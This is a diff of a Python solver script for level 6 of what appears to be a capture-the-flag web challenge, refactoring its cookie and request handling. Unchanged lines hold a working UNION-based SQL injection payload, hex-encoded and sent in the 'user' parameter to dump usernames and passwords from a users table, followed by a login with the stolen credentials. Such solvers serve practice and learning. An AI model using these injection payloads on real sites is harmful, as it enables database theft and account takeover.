@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 import pickle
 import tigers as tg
+import tiger_cookies
+from connect import my_request as req
 
 
 def str_to_hex(s: str) -> str:
@@ -15,25 +17,17 @@ def main():
     base_name = 'level6_users'
     finds = ['username', 'password']  # What we are finding
     pass_r = 'The password for the next level is: '
+    level = 'level6login'
 
-    try:
-        with open('cooks.pickle', 'rb') as f:
-            cooks = pickle.load(f)
-        if 'level6login' not in cooks:
-            print('use prevision level')
-            exit(1)
-    except:
-        print('use level 1')
-        exit(1)
-
-    cook = dict(level6login=cooks['level6login'])
+    cooks = tiger_cookies.check_cookies(level)
+    cook = dict(level6login=cooks[level])
 
     # Counting the number of columns
     p = f"' union select username,username,password,password,password from {base_name} where status=1 #"
     h = str_to_hex(p)
     print(h)
 
-    html_visible = tg.get_request(url, dict(user='1'), cook)
+    html_visible = req.get_request(url, dict(user='1'), cook)
     p = f"0 union select 1,{h},3,4,5 from {base_name} where status=1"
     data = dict(user=p)
     keys = tg.find_param(url, len(finds), html_visible,
@@ -41,16 +35,12 @@ def main():
 
     # Authorization
     data = dict(user=keys[0], password=keys[1], login='Login')
-    response = tg.get_request(url, data, cook, method='post')
+    response = req.post_request(url, data, cook)
 
     # Еxtracting data from html
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
     print('password:', passw)
-
-    # Save cookie
-    if ('level7login' not in cooks) or (cooks['level7login'] != passw):
-        cooks['level7login'] = passw
-        tg.save_cookies(cooks)
+    tiger_cookies.save_cookies(cooks, level, passw)
 
 
 if __name__ == '__main__':
